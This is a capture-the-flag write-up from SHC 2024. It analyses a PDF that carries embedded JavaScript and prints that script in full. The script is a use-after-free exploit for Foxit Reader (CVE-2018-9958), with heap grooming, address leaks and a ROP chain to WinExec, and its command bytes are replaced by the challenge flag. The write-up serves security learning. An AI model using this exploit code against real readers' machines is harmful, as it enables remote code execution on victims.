+++
title = 'SHC 2024 Printer Destroyer Format'
date = 2024-05-06T02:59:11+02:00
draft = false
tags = ["SHC-2024", "reverse-engineering", "CVE-2018-9958"]
description = ""
showFullContent = false
+++

> I received a todo list from IT which I really need to complete.  
> Clippy is telling lies and says it is not safe to open this PDF :(  
> Stupid Clippy  

This one of my favourites challenges of this year's SHC. We got an apparently simple PDF file in which we can expect some sort of macro if we believe what we’re told in the intro.

The tool `pdfextract` from the origami repository is incredibly helpful, as it extracts everything we might be interested in for a ctf challenge : images, streams, scripts and attachments, and creates a directory in which it puts everything.

```Bash
➜  printer-destroyer-format pdfextract todo-list.pdf
➜  printer-destroyer-format tree
.
├── todo-list.dump
│   ├── attachments
│   ├── fonts
│   │   └── BCDFEE+Aptos
│   ├── images
│   ├── scripts
│   │   └── script_3292974706880921474.js
│   └── streams
│       ├── stream_17.dmp
│       ├── stream_4.dmp
│       ├── stream_49.dmp
│       └── stream_65.dmp
└── todo-list.pdf
```

As we can see, it extracted a script (which was huge hex-encoded block in the hexdump, I had to decode it manually). It looks like this :

```JavaScript
var heap_ptr = 0;
var foxit_base = 0;
var pwn_array = [];

function prepare_heap(size) {
    var arr = new Array(size);
    for (var i = 0; i < size; i++) {
        arr[i] = this.addAnnot({ type: "Text" });;
        if (typeof arr[i] == "object") {
            arr[i].destroy();
        }
    }
}

function gc() {
    const maxMallocBytes = 128 * 0x100000;
    for (var i = 0; i < 3; i++) {
        var x = new ArrayBuffer(maxMallocBytes);
    }
}

function alloc_at_leak() {
    for (var i = 0; i < 0x64; i++) {
        pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));
    }
}

function control_memory() {
    for (var i = 0; i < 0x64; i++) {
        for (var j = 0; j < pwn_array[i].length; j++) {
            pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4
        }
    }
}

function leak_vtable() {
    var a = this.addAnnot({ type: "Text" });

    a.destroy();
    gc();

    prepare_heap(0x400);
    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    var leaked = stolen[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
}

function leak_heap_chunk() {
    var a = this.addAnnot({ type: "Text" });
    a.destroy();
    prepare_heap(0x400);

    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    alloc_at_leak();
    heap_ptr = stolen[1];
}

function reclaim() {
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x60);
        var rop = new Int32Array(arr[i]);

        rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
        rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
        rop[0x02] = 0x72727272;              // junk
        rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
        rop[0x04] = 0xffffffff;              // ret of WinExec
        rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
        rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
        rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
        rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
        rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
        rop[0x0a] = foxit_base + 0x0041c6ca; // ret
        rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret


        rop[0x0c] = 0x32636873
        rop[0x0d] = 0x7b343230
        rop[0x0e] = 0x70696c63
        rop[0x0f] = 0x635f7970
        rop[0x10] = 0x5f746e61
        rop[0x11] = 0x706c6568
        rop[0x12] = 0x756f795f
        rop[0x13] = 0x7d21215f
        rop[0x14] = 0x00000000
        rop[0x15] = 0x00000000
        rop[0x16] = 0x00000000


        rop[0x17] = 0x00000000; // adios, amigo :) (from original exploit from https://www.exploit-db.com/exploits/44941)
    }
}

function trigger_uaf() {
    var that = this;
    var a = this.addAnnot({ type: "Text", page: 0, name: "uaf" });
    var arr = [1];
    Object.defineProperties(arr, {
        "0": {
            get: function () {

                that.getAnnot(0, "uaf").destroy();

                reclaim();
                return 1;
            }
        }
    });

    a.point = arr;
}

function main() {
    leak_heap_chunk();
    leak_vtable();
    control_memory();
    trigger_uaf();
}

main();
```

Looking at the code, we can quickly understand that it’s a pretty sophisticated pwn exploit, as we see some heap manipulation. Searching through exploit-db for the first lines of that exploit, we discover that it’s the exact copy of a Foxit Reader exploit from 2018. Actually, _not an exact copy_ as we see that there’s something strange in the shellcode, something not commented, looking like hexadecimal :

```JavaScript
rop[0x0c] = 0x32636873
rop[0x0d] = 0x7b343230
rop[0x0e] = 0x70696c63
rop[0x0f] = 0x635f7970
rop[0x10] = 0x5f746e61
rop[0x11] = 0x706c6568
rop[0x12] = 0x756f795f
rop[0x13] = 0x7d21215f
rop[0x14] = 0x00000000
rop[0x15] = 0x00000000
rop[0x16] = 0x00000000
```

If we go and decode these values, we get the flag : `shc2024{clippy_cant_help_you_!!}`

